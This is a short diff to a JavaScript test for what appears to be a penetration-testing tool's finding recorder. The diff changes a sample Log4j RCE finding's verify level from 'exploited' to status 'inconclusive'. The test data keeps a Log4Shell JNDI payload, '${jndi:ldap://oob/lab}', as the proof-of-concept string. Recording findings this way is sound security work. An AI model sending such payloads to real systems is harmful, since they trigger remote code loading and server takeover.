@@ -88,8 +88,8 @@ const tmpFile = (...names) => path.join(TMP, ...names);
     process.env.TI_CACHE_DIR = tmpFile('ti-cache');    // warmed above
     const RF = require('./record-finding');
     const res = RF.record(JSON.stringify({
-      severity: 'High', title: 'RCE via log4j lookup', host: 'lab.local', endpoint: '/api/log',
-      poc: '${jndi:ldap://oob/lab}', verify_level: 'exploited', cves: ['CVE-2021-44228'],
+      severity: 'High', title: 'RCE via log4j lookup', host: 'lab.local', endpoint: '/api/log', status: 'inconclusive',
+      poc: '${jndi:ldap://oob/lab}', cves: ['CVE-2021-44228'],
     }));
     assert.strictEqual(res.ok, true, res.error);
     const row = JSON.parse(fs.readFileSync(process.env.FINDINGS_JSONL, 'utf8').trim());
